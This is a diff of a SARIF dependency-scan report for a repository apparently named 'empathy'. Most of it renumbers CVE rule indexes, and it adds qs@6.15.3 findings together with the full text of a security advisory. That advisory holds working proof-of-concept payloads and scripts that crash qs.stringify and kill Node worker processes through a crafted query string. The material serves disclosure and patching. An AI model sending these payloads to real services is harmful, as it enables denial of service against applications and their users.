+              "id": -1,
+              "logicalLocations": [],
+              "physicalLocation": {
+                "artifactLocation": {
+                  "index": -1,
+                  "uri": "file:///home/runner/work/empathy/empathy/egolint/pnpm-lock.yaml"
+                }
+              },
+              "relationships": []
+            }
+          ],
+          "message": {
+            "arguments": [],
+            "text": "Package 'qs@6.15.3' is vulnerable to 'CVE-2026-82562' (also known as 'GHSA-x5fp-wj9c-mxmx')."
+          },
+          "rank": -1,
+          "relatedLocations": [],
+          "ruleId": "CVE-2026-82562",
+          "ruleIndex": 107,
+          "stacks": [],
+          "taxa": []
+        },
+        {
+          "partialFingerprints": {
+            "primaryLocationLineHash": "6ceea51936ea24ccb053ca44fae5dba045cbb6c7335211bbef7d712d8224857b"
+          },
+          "attachments": [],
+          "codeFlows": [],
+          "fixes": [],
+          "graphTraversals": [],
+          "graphs": [],
+          "kind": "fail",
+          "level": "warning",
+          "locations": [
+            {
+              "annotations": [],
+              "id": -1,
+              "logicalLocations": [],
+              "physicalLocation": {
+                "artifactLocation": {
+                  "index": -1,
+                  "uri": "file:///home/runner/work/empathy/empathy/pnpm-lock.yaml"
+                }
+              },
+              "relationships": []
+            }
+          ],
+          "message": {
+            "arguments": [],
+            "text": "Package 'qs@6.15.3' is vulnerable to 'CVE-2026-82562' (also known as 'GHSA-x5fp-wj9c-mxmx')."
+          },
+          "rank": -1,
+          "relatedLocations": [],
+          "ruleId": "CVE-2026-82562",
+          "ruleIndex": 107,
           "stacks": [],
           "taxa": []
         },
@@ -4090,7 +4522,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-48817",
-          "ruleIndex": 102,
+          "ruleIndex": 108,
           "stacks": [],
           "taxa": []
         },
@@ -4126,7 +4558,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-48526",
-          "ruleIndex": 103,
+          "ruleIndex": 109,
           "stacks": [],
           "taxa": []
         },
@@ -4162,7 +4594,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-41242",
-          "ruleIndex": 104,
+          "ruleIndex": 110,
           "stacks": [],
           "taxa": []
         },
@@ -4198,7 +4630,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2025-13465",
-          "ruleIndex": 46,
+          "ruleIndex": 48,
           "stacks": [],
           "taxa": []
         },
@@ -4234,7 +4666,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2025-45768",
-          "ruleIndex": 105,
+          "ruleIndex": 111,
           "stacks": [],
           "taxa": []
         },
@@ -4270,7 +4702,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2025-67221",
-          "ruleIndex": 61,
+          "ruleIndex": 65,
           "stacks": [],
           "taxa": []
         },
@@ -4306,7 +4738,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-32597",
-          "ruleIndex": 28,
+          "ruleIndex": 30,
           "stacks": [],
           "taxa": []
         },
@@ -4342,7 +4774,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-22701",
-          "ruleIndex": 81,
+          "ruleIndex": 86,
           "stacks": [],
           "taxa": []
         },
@@ -4378,7 +4810,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2025-68146",
-          "ruleIndex": 97,
+          "ruleIndex": 102,
           "stacks": [],
           "taxa": []
         },
@@ -4414,7 +4846,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-44431",
-          "ruleIndex": 79,
+          "ruleIndex": 84,
           "stacks": [],
           "taxa": []
         },
@@ -4450,7 +4882,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-48710",
-          "ruleIndex": 34,
+          "ruleIndex": 36,
           "stacks": [],
           "taxa": []
         },
@@ -4486,7 +4918,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-48522",
-          "ruleIndex": 39,
+          "ruleIndex": 41,
           "stacks": [],
           "taxa": []
         },
@@ -4522,7 +4954,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-48523",
-          "ruleIndex": 65,
+          "ruleIndex": 69,
           "stacks": [],
           "taxa": []
         },
@@ -4558,7 +4990,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-48524",
-          "ruleIndex": 49,
+          "ruleIndex": 52,
           "stacks": [],
           "taxa": []
         },
@@ -4594,7 +5026,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-48525",
-          "ruleIndex": 96,
+          "ruleIndex": 101,
           "stacks": [],
           "taxa": []
         },
@@ -4630,7 +5062,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-48526",
-          "ruleIndex": 103,
+          "ruleIndex": 109,
           "stacks": [],
           "taxa": []
         },
@@ -4666,7 +5098,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2025-71176",
-          "ruleIndex": 27,
+          "ruleIndex": 29,
           "stacks": [],
           "taxa": []
         },
@@ -4702,7 +5134,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-24486",
-          "ruleIndex": 100,
+          "ruleIndex": 105,
           "stacks": [],
           "taxa": []
         },
@@ -4774,7 +5206,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2025-62727",
-          "ruleIndex": 30,
+          "ruleIndex": 32,
           "stacks": [],
           "taxa": []
         },
@@ -4882,7 +5314,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2025-66418",
-          "ruleIndex": 58,
+          "ruleIndex": 62,
           "stacks": [],
           "taxa": []
         },
@@ -4918,7 +5350,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-22702",
-          "ruleIndex": 18,
+          "ruleIndex": 19,
           "stacks": [],
           "taxa": []
         },
@@ -4954,7 +5386,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-31900",
-          "ruleIndex": 106,
+          "ruleIndex": 112,
           "stacks": [],
           "taxa": []
         },
@@ -5026,7 +5458,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-7246",
-          "ruleIndex": 107,
+          "ruleIndex": 113,
           "stacks": [],
           "taxa": []
         },
@@ -5062,7 +5494,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-26007",
-          "ruleIndex": 83,
+          "ruleIndex": 88,
           "stacks": [],
           "taxa": []
         },
@@ -5098,7 +5530,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-45409",
-          "ruleIndex": 23,
+          "ruleIndex": 25,
           "stacks": [],
           "taxa": []
         },
@@ -5134,7 +5566,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-28684",
-          "ruleIndex": 71,
+          "ruleIndex": 76,
           "stacks": [],
           "taxa": []
         },
@@ -5170,7 +5602,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-25645",
-          "ruleIndex": 57,
+          "ruleIndex": 61,
           "stacks": [],
           "taxa": []
         },
@@ -5206,7 +5638,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-48817",
-          "ruleIndex": 102,
+          "ruleIndex": 108,
           "stacks": [],
           "taxa": []
         },
@@ -5242,7 +5674,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-48818",
-          "ruleIndex": 101,
+          "ruleIndex": 106,
           "stacks": [],
           "taxa": []
         },
@@ -5278,7 +5710,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-32874",
-          "ruleIndex": 99,
+          "ruleIndex": 104,
           "stacks": [],
           "taxa": []
         },
@@ -5314,7 +5746,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-32875",
-          "ruleIndex": 44,
+          "ruleIndex": 46,
           "stacks": [],
           "taxa": []
         },
@@ -5350,7 +5782,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-44660",
-          "ruleIndex": 42,
+          "ruleIndex": 44,
           "stacks": [],
           "taxa": []
         },
@@ -5422,7 +5854,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-54282",
-          "ruleIndex": 64,
+          "ruleIndex": 68,
           "stacks": [],
           "taxa": []
         },
@@ -5458,7 +5890,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-54283",
-          "ruleIndex": 32,
+          "ruleIndex": 34,
           "stacks": [],
           "taxa": []
         },
@@ -5530,7 +5962,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-4539",
-          "ruleIndex": 14,
+          "ruleIndex": 15,
           "stacks": [],
           "taxa": []
         },
@@ -5566,7 +5998,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-53539",
-          "ruleIndex": 21,
+          "ruleIndex": 23,
           "stacks": [],
           "taxa": []
         },
@@ -5602,7 +6034,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-53538",
-          "ruleIndex": 26,
+          "ruleIndex": 28,
           "stacks": [],
           "taxa": []
         },
@@ -5638,7 +6070,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-40347",
-          "ruleIndex": 73,
+          "ruleIndex": 78,
           "stacks": [],
           "taxa": []
         },
@@ -5674,7 +6106,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-42561",
-          "ruleIndex": 77,
+          "ruleIndex": 82,
           "stacks": [],
           "taxa": []
         },
@@ -5710,7 +6142,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-53540",
-          "ruleIndex": 89,
+          "ruleIndex": 94,
           "stacks": [],
           "taxa": []
         },
@@ -5746,7 +6178,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-53537",
-          "ruleIndex": 91,
+          "ruleIndex": 96,
           "stacks": [],
           "taxa": []
         },
@@ -5782,7 +6214,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-34073",
-          "ruleIndex": 70,
+          "ruleIndex": 75,
           "stacks": [],
           "taxa": []
         },
@@ -5818,7 +6250,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-69247",
-          "ruleIndex": 53,
+          "ruleIndex": 57,
           "stacks": [],
           "taxa": []
         },
@@ -5854,7 +6286,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-69249",
-          "ruleIndex": 67,
+          "ruleIndex": 72,
           "stacks": [],
           "taxa": []
         },
@@ -5890,7 +6322,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-69248",
-          "ruleIndex": 68,
+          "ruleIndex": 73,
           "stacks": [],
           "taxa": []
         },
@@ -5926,7 +6358,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-39892",
-          "ruleIndex": 74,
+          "ruleIndex": 79,
           "stacks": [],
           "taxa": []
         },
@@ -5962,7 +6394,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-39373",
-          "ruleIndex": 50,
+          "ruleIndex": 53,
           "stacks": [],
           "taxa": []
         },
@@ -5998,7 +6430,7 @@
           "rank": -1,
           "relatedLocations": [],
           "ruleId": "CVE-2026-41205",
-          "ruleIndex": 87,
+          "ruleIndex": 92,
           "stacks": [],
           "taxa": []
         }
@@ -6363,6 +6795,30 @@
             },
             {
               "deprecatedIds": [
+                "CVE-2026-82417",
+                "GHSA-4mjr-xmp4-gh2g"
+              ],
+              "fullDescription": {
+                "markdown": "### Summary\n\n`qs.stringify()` calls `utils.isBuffer()` on every value it serializes, and `utils.isBuffer()` invokes `obj.constructor.isBuffer(obj)` without checking that it is callable. A value whose own `constructor.isBuffer` is a non-function makes `qs` call a non-callable and throw `TypeError`. Such a value is produced **by `qs.parse` itself** from an untrusted query string when `plainObjects: true` or `allowPrototypes: true` is set, so a pure-`qs` `parse` → `stringify` round-trip — no `JSON.parse` — turns an unauthenticated query string into an uncaught throw.\n\nAn attacker-controlled `parse` input reaches the host application's availability asset — via `qs`'s own recommended `plainObjects` mitigation — and triggers an uncaught exception during a `parse` → `stringify` round-trip.\n\n### Details\n`utils.isBuffer` runs at `lib/stringify.js:127` for every serialized value:\n\n```js\nif (isNonNullishPrimitive(obj) || utils.isBuffer(obj)) { ... }\n```\n\n`utils.isBuffer` (`lib/utils.js:327-333`) invokes `obj.constructor.isBuffer` without verifying it is callable:\n\n```js\nvar isBuffer = function isBuffer(obj) {\n    if (!obj || typeof obj !== 'object') { return false; }\n    return !!(obj.constructor \u0026\u0026 obj.constructor.isBuffer \u0026\u0026 obj.constructor.isBuffer(obj));\n};\n```\n\n`constructor` and `isBuffer` are ordinary keys. `qs.parse` with `plainObjects: true` or `allowPrototypes: true` keeps them as own properties, so the parsed value carries a non-function `constructor.isBuffer`; `stringify` then calls a non-callable and throws `TypeError`. By contrast `utils.isRegExp` uses a brand check (`Object.prototype.toString`); the missing guard here is an internal inconsistency, not a platform limitation.\n\n\n### Trust Boundary Note\n\n`qs.stringify` alone treats its input as caller-constructed, so serializing a hostile object could be argued outside its contract. This report does not depend on that framing: the malicious shape is produced by **`qs.parse`, whose input is untrusted by design**. `qs.parse` normally strips a `constructor` key via its prototype guard, but with the documented options `plainObjects: true` or `allowPrototypes: true` the key survives and lands as an own property. Feeding the parsed object back into `qs.stringify` — the standard round-trip in gateways and request-forwarders — then hits the unchecked call. \n\n\n### PoC\n`poc02c_isBuffer_qs_only_roundtrip.js` — pure-`qs` chain, no `JSON.parse`; an untrusted query string alone reaches the throw:\n\n```js\n'use strict';\nvar qs = require('qs');\n\nvar untrustedQueryString = 'x%5Bconstructor%5D%5BisBuffer%5D=y'; // x[constructor][isBuffer]=y\n\nvar parsed = qs.parse(untrustedQueryString, { plainObjects: true });\nconsole.log('[parse] kept constructor key:', JSON.stringify(parsed));\n\ntry {\n    qs.stringify(parsed);\n    console.log('[stringify] no throw (unexpected)');\n} catch (e) {\n    console.log('[stringify] DoS reproduced -\u003e', e.constructor.name + ':', e.message);\n}\n```\n\n`poc02_isBuffer.js` — the minimal defect:\n\n```js\n'use strict';\nvar qs = require('qs');\ntry {\n    qs.stringify(JSON.parse('{\"a\":{\"constructor\":{\"isBuffer\":\"x\"}}}'));\n} catch (e) {\n    console.log('[A] DoS reproduced -\u003e', e.constructor.name + ':', e.message);\n}\n```\n\n`poc02b_isBuffer_async_crash.js` — worker death in an async sink:\n\n```js\n'use strict';\nvar qs = require('qs');\n\nfunction handleRequestAsync(clientJsonBody) {\n    try {\n        setImmediate(function () {                 // async continuation, outside the try\n            qs.stringify(JSON.parse(clientJsonBody)); // throws here, uncaught\n        });\n        console.log('[handler] returned 200 synchronously; async work scheduled');\n    } catch (e) {\n        console.log('[handler] caught synchronously (will NOT happen):', e.message);\n    }\n}\nprocess.on('exit', function (code) {\n    console.log('[proc] process exiting with code:', code);\n});\nhandleRequestAsync('{\"filters\":{\"constructor\":{\"isBuffer\":\"x\"}}}');\n```\n\n### Execution Steps\n\n```bash\ncd poc\nnpm install qs@6.15.3\nnode poc02c_isBuffer_qs_only_roundtrip.js  # pure qs parse-\u003estringify -\u003e TypeError\nnode poc02_isBuffer.js                      # minimal defect -\u003e TypeError inside stringify\nnode poc02b_isBuffer_async_crash.js         # async sink -\u003e uncaught throw -\u003e exit code 1\n```\n\n### Reproduction Evidence\n\n`poc02c_isBuffer_qs_only_roundtrip.js` :\n\n```\n[parse] kept constructor key: {\"x\":{\"constructor\":{\"isBuffer\":\"y\"}}}\n[stringify] DoS reproduced -\u003e TypeError: obj.constructor.isBuffer is not a function\n```\n\n`poc02_isBuffer.js`:\n\n```\n[A] DoS reproduced -\u003e TypeError: obj.constructor.isBuffer is not a function\n```\n\n`poc02b_isBuffer_async_crash.js` :\n\n```\n[handler] returned 200 synchronously; async work scheduled\n[proc] process exiting with code: 1\nTypeError: obj.constructor.isBuffer is not a function\n    at Object.isBuffer (.../qs/lib/utils.js:332:78)\n    at stringify (.../qs/lib/stringify.js:127:45)\n=== EXIT CODE: 1 ===\n```\n\nThe pure-`qs` round-trip shows the malicious shape originates from `qs.parse` of an untrusted query string, with no `JSON.parse`. The synchronous `try/catch` in the async case does not catch the throw; the process exits with code 1, denying service to all requests on that worker.\n\n### Impact\n\nAn unauthenticated request degrades any endpoint that re-serializes deserialized client data with `qs.stringify`. The primary impact is a per-request failure: the handler throws and the framework returns HTTP 500. Where the call sits in an unguarded async continuation, the throw escapes and the worker process exits, denying service to all requests it was handling, which means a higher impact that depends on the application's error handling, not on `qs`.\n\n### Recommended Fix\n\nReplace the duck-type with a brand check mirroring `utils.isRegExp`:\n\n```js\nvar isBuffer = function isBuffer(obj) {\n    if (!obj || typeof obj !== 'object') { return false; }\n    if (typeof Buffer !== 'undefined' \u0026\u0026 typeof Buffer.isBuffer === 'function') {\n        return Buffer.isBuffer(obj);\n    }\n    return Object.prototype.toString.call(obj) === '[object Uint8Array]';\n};\n```\n\nIf duck-typing must remain, require `typeof obj.constructor.isBuffer === 'function'` before invoking and wrap the call in `try/catch`.",
+                "text": "### Summary\n\n`qs.stringify()` calls `utils.isBuffer()` on every value it serializes, and `utils.isBuffer()` invokes `obj.constructor.isBuffer(obj)` without checking that it is callable. A value whose own `constructor.isBuffer` is a non-function makes `qs` call a non-callable and throw `TypeError`. Such a value is produced **by `qs.parse` itself** from an untrusted query string when `plainObjects: true` or `allowPrototypes: true` is set, so a pure-`qs` `parse` → `stringify` round-trip — no `JSON.parse` — turns an unauthenticated query string into an uncaught throw.\n\nAn attacker-controlled `parse` input reaches the host application's availability asset — via `qs`'s own recommended `plainObjects` mitigation — and triggers an uncaught exception during a `parse` → `stringify` round-trip.\n\n### Details\n`utils.isBuffer` runs at `lib/stringify.js:127` for every serialized value:\n\n```js\nif (isNonNullishPrimitive(obj) || utils.isBuffer(obj)) { ... }\n```\n\n`utils.isBuffer` (`lib/utils.js:327-333`) invokes `obj.constructor.isBuffer` without verifying it is callable:\n\n```js\nvar isBuffer = function isBuffer(obj) {\n    if (!obj || typeof obj !== 'object') { return false; }\n    return !!(obj.constructor \u0026\u0026 obj.constructor.isBuffer \u0026\u0026 obj.constructor.isBuffer(obj));\n};\n```\n\n`constructor` and `isBuffer` are ordinary keys. `qs.parse` with `plainObjects: true` or `allowPrototypes: true` keeps them as own properties, so the parsed value carries a non-function `constructor.isBuffer`; `stringify` then calls a non-callable and throws `TypeError`. By contrast `utils.isRegExp` uses a brand check (`Object.prototype.toString`); the missing guard here is an internal inconsistency, not a platform limitation.\n\n\n### Trust Boundary Note\n\n`qs.stringify` alone treats its input as caller-constructed, so serializing a hostile object could be argued outside its contract. This report does not depend on that framing: the malicious shape is produced by **`qs.parse`, whose input is untrusted by design**. `qs.parse` normally strips a `constructor` key via its prototype guard, but with the documented options `plainObjects: true` or `allowPrototypes: true` the key survives and lands as an own property. Feeding the parsed object back into `qs.stringify` — the standard round-trip in gateways and request-forwarders — then hits the unchecked call. \n\n\n### PoC\n`poc02c_isBuffer_qs_only_roundtrip.js` — pure-`qs` chain, no `JSON.parse`; an untrusted query string alone reaches the throw:\n\n```js\n'use strict';\nvar qs = require('qs');\n\nvar untrustedQueryString = 'x%5Bconstructor%5D%5BisBuffer%5D=y'; // x[constructor][isBuffer]=y\n\nvar parsed = qs.parse(untrustedQueryString, { plainObjects: true });\nconsole.log('[parse] kept constructor key:', JSON.stringify(parsed));\n\ntry {\n    qs.stringify(parsed);\n    console.log('[stringify] no throw (unexpected)');\n} catch (e) {\n    console.log('[stringify] DoS reproduced -\u003e', e.constructor.name + ':', e.message);\n}\n```\n\n`poc02_isBuffer.js` — the minimal defect:\n\n```js\n'use strict';\nvar qs = require('qs');\ntry {\n    qs.stringify(JSON.parse('{\"a\":{\"constructor\":{\"isBuffer\":\"x\"}}}'));\n} catch (e) {\n    console.log('[A] DoS reproduced -\u003e', e.constructor.name + ':', e.message);\n}\n```\n\n`poc02b_isBuffer_async_crash.js` — worker death in an async sink:\n\n```js\n'use strict';\nvar qs = require('qs');\n\nfunction handleRequestAsync(clientJsonBody) {\n    try {\n        setImmediate(function () {                 // async continuation, outside the try\n            qs.stringify(JSON.parse(clientJsonBody)); // throws here, uncaught\n        });\n        console.log('[handler] returned 200 synchronously; async work scheduled');\n    } catch (e) {\n        console.log('[handler] caught synchronously (will NOT happen):', e.message);\n    }\n}\nprocess.on('exit', function (code) {\n    console.log('[proc] process exiting with code:', code);\n});\nhandleRequestAsync('{\"filters\":{\"constructor\":{\"isBuffer\":\"x\"}}}');\n```\n\n### Execution Steps\n\n```bash\ncd poc\nnpm install qs@6.15.3\nnode poc02c_isBuffer_qs_only_roundtrip.js  # pure qs parse-\u003estringify -\u003e TypeError\nnode poc02_isBuffer.js                      # minimal defect -\u003e TypeError inside stringify\nnode poc02b_isBuffer_async_crash.js         # async sink -\u003e uncaught throw -\u003e exit code 1\n```\n\n### Reproduction Evidence\n\n`poc02c_isBuffer_qs_only_roundtrip.js` :\n\n```\n[parse] kept constructor key: {\"x\":{\"constructor\":{\"isBuffer\":\"y\"}}}\n[stringify] DoS reproduced -\u003e TypeError: obj.constructor.isBuffer is not a function\n```\n\n`poc02_isBuffer.js`:\n\n```\n[A] DoS reproduced -\u003e TypeError: obj.constructor.isBuffer is not a function\n```\n\n`poc02b_isBuffer_async_crash.js` :\n\n```\n[handler] returned 200 synchronously; async work scheduled\n[proc] process exiting with code: 1\nTypeError: obj.constructor.isBuffer is not a function\n    at Object.isBuffer (.../qs/lib/utils.js:332:78)\n    at stringify (.../qs/lib/stringify.js:127:45)\n=== EXIT CODE: 1 ===\n```\n\nThe pure-`qs` round-trip shows the malicious shape originates from `qs.parse` of an untrusted query string, with no `JSON.parse`. The synchronous `try/catch` in the async case does not catch the throw; the process exits with code 1, denying service to all requests on that worker.\n\n### Impact\n\nAn unauthenticated request degrades any endpoint that re-serializes deserialized client data with `qs.stringify`. The primary impact is a per-request failure: the handler throws and the framework returns HTTP 500. Where the call sits in an unguarded async continuation, the throw escapes and the worker process exits, denying service to all requests it was handling, which means a higher impact that depends on the application's error handling, not on `qs`.\n\n### Recommended Fix\n\nReplace the duck-type with a brand check mirroring `utils.isRegExp`:\n\n```js\nvar isBuffer = function isBuffer(obj) {\n    if (!obj || typeof obj !== 'object') { return false; }\n    if (typeof Buffer !== 'undefined' \u0026\u0026 typeof Buffer.isBuffer === 'function') {\n        return Buffer.isBuffer(obj);\n    }\n    return Object.prototype.toString.call(obj) === '[object Uint8Array]';\n};\n```\n\nIf duck-typing must remain, require `typeof obj.constructor.isBuffer === 'function'` before invoking and wrap the call in `try/catch`."
+              },
+              "help": {
+                "markdown": "**Your dependency is vulnerable to [CVE-2026-82417](https://osv.dev/CVE-2026-82417)**.\n\n## [GHSA-4mjr-xmp4-gh2g](https://osv.dev/GHSA-4mjr-xmp4-gh2g)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Summary\n\u003e \n\u003e `qs.stringify()` calls `utils.isBuffer()` on every value it serializes, and `utils.isBuffer()` invokes `obj.constructor.isBuffer(obj)` without checking that it is callable. A value whose own `constructor.isBuffer` is a non-function makes `qs` call a non-callable and throw `TypeError`. Such a value is produced **by `qs.parse` itself** from an untrusted query string when `plainObjects: true` or `allowPrototypes: true` is set, so a pure-`qs` `parse` → `stringify` round-trip — no `JSON.parse` — turns an unauthenticated query string into an uncaught throw.\n\u003e \n\u003e An attacker-controlled `parse` input reaches the host application's availability asset — via `qs`'s own recommended `plainObjects` mitigation — and triggers an uncaught exception during a `parse` → `stringify` round-trip.\n\u003e \n\u003e ### Details\n\u003e `utils.isBuffer` runs at `lib/stringify.js:127` for every serialized value:\n\u003e \n\u003e ```js\n\u003e if (isNonNullishPrimitive(obj) || utils.isBuffer(obj)) { ... }\n\u003e ```\n\u003e \n\u003e `utils.isBuffer` (`lib/utils.js:327-333`) invokes `obj.constructor.isBuffer` without verifying it is callable:\n\u003e \n\u003e ```js\n\u003e var isBuffer = function isBuffer(obj) {\n\u003e     if (!obj || typeof obj !== 'object') { return false; }\n\u003e     return !!(obj.constructor \u0026\u0026 obj.constructor.isBuffer \u0026\u0026 obj.constructor.isBuffer(obj));\n\u003e };\n\u003e ```\n\u003e \n\u003e `constructor` and `isBuffer` are ordinary keys. `qs.parse` with `plainObjects: true` or `allowPrototypes: true` keeps them as own properties, so the parsed value carries a non-function `constructor.isBuffer`; `stringify` then calls a non-callable and throws `TypeError`. By contrast `utils.isRegExp` uses a brand check (`Object.prototype.toString`); the missing guard here is an internal inconsistency, not a platform limitation.\n\u003e \n\u003e \n\u003e ### Trust Boundary Note\n\u003e \n\u003e `qs.stringify` alone treats its input as caller-constructed, so serializing a hostile object could be argued outside its contract. This report does not depend on that framing: the malicious shape is produced by **`qs.parse`, whose input is untrusted by design**. `qs.parse` normally strips a `constructor` key via its prototype guard, but with the documented options `plainObjects: true` or `allowPrototypes: true` the key survives and lands as an own property. Feeding the parsed object back into `qs.stringify` — the standard round-trip in gateways and request-forwarders — then hits the unchecked call. \n\u003e \n\u003e \n\u003e ### PoC\n\u003e `poc02c_isBuffer_qs_only_roundtrip.js` — pure-`qs` chain, no `JSON.parse`; an untrusted query string alone reaches the throw:\n\u003e \n\u003e ```js\n\u003e 'use strict';\n\u003e var qs = require('qs');\n\u003e \n\u003e var untrustedQueryString = 'x%5Bconstructor%5D%5BisBuffer%5D=y'; // x[constructor][isBuffer]=y\n\u003e \n\u003e var parsed = qs.parse(untrustedQueryString, { plainObjects: true });\n\u003e console.log('[parse] kept constructor key:', JSON.stringify(parsed));\n\u003e \n\u003e try {\n\u003e     qs.stringify(parsed);\n\u003e     console.log('[stringify] no throw (unexpected)');\n\u003e } catch (e) {\n\u003e     console.log('[stringify] DoS reproduced -\u003e', e.constructor.name + ':', e.message);\n\u003e }\n\u003e ```\n\u003e \n\u003e `poc02_isBuffer.js` — the minimal defect:\n\u003e \n\u003e ```js\n\u003e 'use strict';\n\u003e var qs = require('qs');\n\u003e try {\n\u003e     qs.stringify(JSON.parse('{\"a\":{\"constructor\":{\"isBuffer\":\"x\"}}}'));\n\u003e } catch (e) {\n\u003e     console.log('[A] DoS reproduced -\u003e', e.constructor.name + ':', e.message);\n\u003e }\n\u003e ```\n\u003e \n\u003e `poc02b_isBuffer_async_crash.js` — worker death in an async sink:\n\u003e \n\u003e ```js\n\u003e 'use strict';\n\u003e var qs = require('qs');\n\u003e \n\u003e function handleRequestAsync(clientJsonBody) {\n\u003e     try {\n\u003e         setImmediate(function () {                 // async continuation, outside the try\n\u003e             qs.stringify(JSON.parse(clientJsonBody)); // throws here, uncaught\n\u003e         });\n\u003e         console.log('[handler] returned 200 synchronously; async work scheduled');\n\u003e     } catch (e) {\n\u003e         console.log('[handler] caught synchronously (will NOT happen):', e.message);\n\u003e     }\n\u003e }\n\u003e process.on('exit', function (code) {\n\u003e     console.log('[proc] process exiting with code:', code);\n\u003e });\n\u003e handleRequestAsync('{\"filters\":{\"constructor\":{\"isBuffer\":\"x\"}}}');\n\u003e ```\n\u003e \n\u003e ### Execution Steps\n\u003e \n\u003e ```bash\n\u003e cd poc\n\u003e npm install qs@6.15.3\n\u003e node poc02c_isBuffer_qs_only_roundtrip.js  # pure qs parse-\u003estringify -\u003e TypeError\n\u003e node poc02_isBuffer.js                      # minimal defect -\u003e TypeError inside stringify\n\u003e node poc02b_isBuffer_async_crash.js         # async sink -\u003e uncaught throw -\u003e exit code 1\n\u003e ```\n\u003e \n\u003e ### Reproduction Evidence\n\u003e \n\u003e `poc02c_isBuffer_qs_only_roundtrip.js` :\n\u003e \n\u003e ```\n\u003e [parse] kept constructor key: {\"x\":{\"constructor\":{\"isBuffer\":\"y\"}}}\n\u003e [stringify] DoS reproduced -\u003e TypeError: obj.constructor.isBuffer is not a function\n\u003e ```\n\u003e \n\u003e `poc02_isBuffer.js`:\n\u003e \n\u003e ```\n\u003e [A] DoS reproduced -\u003e TypeError: obj.constructor.isBuffer is not a function\n\u003e ```\n\u003e \n\u003e `poc02b_isBuffer_async_crash.js` :\n\u003e \n\u003e ```\n\u003e [handler] returned 200 synchronously; async work scheduled\n\u003e [proc] process exiting with code: 1\n\u003e TypeError: obj.constructor.isBuffer is not a function\n\u003e     at Object.isBuffer (.../qs/lib/utils.js:332:78)\n\u003e     at stringify (.../qs/lib/stringify.js:127:45)\n\u003e === EXIT CODE: 1 ===\n\u003e ```\n\u003e \n\u003e The pure-`qs` round-trip shows the malicious shape originates from `qs.parse` of an untrusted query string, with no `JSON.parse`. The synchronous `try/catch` in the async case does not catch the throw; the process exits with code 1, denying service to all requests on that worker.\n\u003e \n\u003e ### Impact\n\u003e \n\u003e An unauthenticated request degrades any endpoint that re-serializes deserialized client data with `qs.stringify`. The primary impact is a per-request failure: the handler throws and the framework returns HTTP 500. Where the call sits in an unguarded async continuation, the throw escapes and the worker process exits, denying service to all requests it was handling, which means a higher impact that depends on the application's error handling, not on `qs`.\n\u003e \n\u003e ### Recommended Fix\n\u003e \n\u003e Replace the duck-type with a brand check mirroring `utils.isRegExp`:\n\u003e \n\u003e ```js\n\u003e var isBuffer = function isBuffer(obj) {\n\u003e     if (!obj || typeof obj !== 'object') { return false; }\n\u003e     if (typeof Buffer !== 'undefined' \u0026\u0026 typeof Buffer.isBuffer === 'function') {\n\u003e         return Buffer.isBuffer(obj);\n\u003e     }\n\u003e     return Object.prototype.toString.call(obj) === '[object 